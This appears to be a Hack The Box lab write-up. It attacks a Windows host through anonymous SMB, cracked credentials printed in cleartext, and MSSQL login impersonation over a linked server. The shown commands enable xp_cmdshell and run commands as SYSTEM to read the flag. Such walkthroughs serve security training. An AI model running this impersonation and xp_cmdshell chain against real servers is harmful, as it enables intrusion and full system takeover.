### SMB - Port 445
Anonymous login is allowed. Inside we found the folder Home where we find three users: fiona, john and simon.

We retrieve three password list and with crackmapexec we found credentials for fiona:48Ns72!bns74@S84NNNSl


### RDP - Port 3389
With the found credentials for fiona we can log in



### MSSQL - Port 1433
We can connect using fiona credentials and the following command
	`sqsh -S 10.129.203.10 -U .\\fiona -P '48Ns72!bns74@S84NNNSl' -h`

Identify linked Servers in MSSQL

```bash
1> select SRVNAME, ISREMOTE from Sysservers
2> go

        WINSRV02\SQLEXPRESS 1
        LOCAL.TEST.LINKED.SRV 0
```

Identify users who can impersonate

```bash
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> go

	john
	simon

1> EXECUTE AS LOGIN = 'simon'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go
        simon   0

1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go
        john   1
```

So john is admin and we can impersonate him

```bash
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go
        WINSRV02\SQLEXPRESS

        Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

        testadmin 1
```

And we can execute commands as john in the linked server

```bash
1> EXECUTE('xp_cmdshell ''whoami''') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]2> go
Msg 15281, Level 16, State 1
Server 'WIN-HARD\SQLEXPRESS', Procedure 'xp_cmdshell', Line 1
SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned
off as part of the security configuration for this server. A system administrator can enable the use of
'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in
SQL Server Books Online.
1> EXECUTE('sp_configure ''show advanced options'', 1') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXECUTE('RECONFIGURE') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go
1> EXECUTE('sp_configure ''xp_cmdshell'', 1') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXECUTE('RECONFIGURE') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go
1> EXECUTE('xp_cmdshell ''whoami''') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go

        nt authority\system
1> EXECUTE('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AS LOGIN = 'john' AT [LOCAL.TEST.LINKED.SRV]
2> go

        HTB{46u$!n9_l!nk3d_$3rv3r$}
```

